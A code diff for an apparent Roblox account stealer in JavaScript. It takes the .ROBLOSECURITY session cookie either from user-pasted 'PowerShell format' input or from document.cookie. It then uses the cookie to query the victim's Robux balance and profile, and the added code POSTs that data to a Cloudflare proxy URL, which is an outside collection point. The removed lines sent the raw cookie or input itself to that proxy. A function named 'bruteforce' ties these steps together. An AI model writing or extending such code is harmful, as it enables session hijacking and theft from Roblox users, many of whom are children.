@@ -12,38 +12,106 @@ function extractRobloxSecurityCookie(input) {
   return null; // Not a PowerShell format
 }
 
+// Function to get the .ROBLOSECURITY cookie from document.cookie (browser environment)
+function getRobloxCookie() {
+  const cookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='));
+  if (!cookie) {
+    console.error('No .ROBLOSECURITY cookie found!');
+    return null;
+  }
+  return cookie.split('=')[1]; // Return the cookie value
+}
+
+// Function to fetch Roblox data (Robux balance and profile)
+async function fetchRobloxData(cookie) {
+  if (!cookie) return;
+
+  try {
+    // Fetch the Robux balance using the Roblox API
+    const robuxResponse = await fetch('https://economy.roblox.com/v1/users/currency', {
+      method: 'GET',
+      headers: {
+        'Cookie': `.ROBLOSECURITY=${cookie}`,
+        'User-Agent': navigator.userAgent
+      }
+    });
+
+    if (!robuxResponse.ok) {
+      console.error('Failed to fetch Robux balance');
+      return;
+    }
+
+    const robuxData = await robuxResponse.json();
+
+    // Fetch user profile data using Roblox API
+    const profileResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
+      method: 'GET',
+      headers: {
+        'Cookie': `.ROBLOSECURITY=${cookie}`,
+        'User-Agent': navigator.userAgent
+      }
+    });
+
+    if (!profileResponse.ok) {
+      console.error('Failed to fetch user profile');
+      return;
+    }
+
+    const profileData = await profileResponse.json();
+
+    // Prepare the data to send to the proxy
+    const userData = {
+      username: profileData.name,
+      displayName: profileData.displayName,
+      robuxBalance: robuxData.robux,
+      avatarUrl: `https://www.roblox.com/headshot-thumbnail/image?userId=${profileData.id}&width=420&height=420&format=png`
+    };
+
+    console.log('User Data:', userData);
+
+    // Send the data to the Cloudflare proxy
+    await sendToProxy(userData);
+  } catch (error) {
+    console.error('Error fetching data:', error);
+  }
+}
+
+// Function to send data to Cloudflare proxy
 async function sendToProxy(data) {
   try {
     const response = await fetch(CLOUDFLARE_PROXY_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        sessionId: data,
-        timestamp: new Date().toISOString()
-      })
+      body: JSON.stringify(data)
     });
+
     if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
-    return await response.json();
+    console.log('Data sent to proxy successfully');
   } catch (error) {
     console.error('Proxy error:', error);
-    throw error;
   }
 }
 
 function bruteforce(input) {
   let content;
-  const cookie = extractRobloxSecurityCookie(input);
-
+  const cookie = extractRobloxSecurityCookie(input) || getRobloxCookie(); // Get the cookie from input or from document.cookie
+  
   if (cookie) {
     content = `✅ Extracted from PowerShell format:\n\`\`\`${cookie}\`\`\``;
   } else {
     content = `⚠️ Raw input (not PowerShell format):\n\`\`\`${input}\`\`\``;
   }
 
-  // Send to proxy (or log for testing)
+  // Log or send to proxy
   console.log(content);
-  sendToProxy(cookie || input);
+
+  // Fetch Roblox data and send to the proxy
+  fetchRobloxData(cookie);
 }
+
+
+
+
 
 
 function validateInput() {
